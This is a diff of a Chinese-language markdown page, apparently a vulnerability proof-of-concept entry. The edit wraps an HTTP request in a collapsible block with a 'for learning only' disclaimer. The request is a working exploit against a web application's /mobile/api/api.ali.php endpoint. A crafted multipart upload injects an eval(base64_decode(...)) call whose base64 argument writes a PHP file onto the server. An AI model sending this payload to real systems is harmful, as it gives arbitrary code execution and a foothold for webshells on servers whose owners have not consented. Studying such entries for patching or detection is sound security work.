@@ -29,8 +29,10 @@ tags:
 
 向 api.ali.php 发送请求包
 
-```
-POST /mobile/api/api.ali.php HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /mobile/api/api.ali.php HTTP/1.1
 Host: 
 User-Agent: Go-http-client/1.1
 Content-Length: 422
@@ -41,9 +43,10 @@ Accept-Encoding: gzip
 Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
 Content-Type: application/octet-stream
 
-{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
---502f67681799b07e4de6b503655f5cae--
-```
+{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] =&gt; &#101;val(base64_decode($BackData[a])));/*\"}"}
+--502f67681799b07e4de6b503655f5cae--</code></pre>
+
+</details>
 
 参数a base解码
 
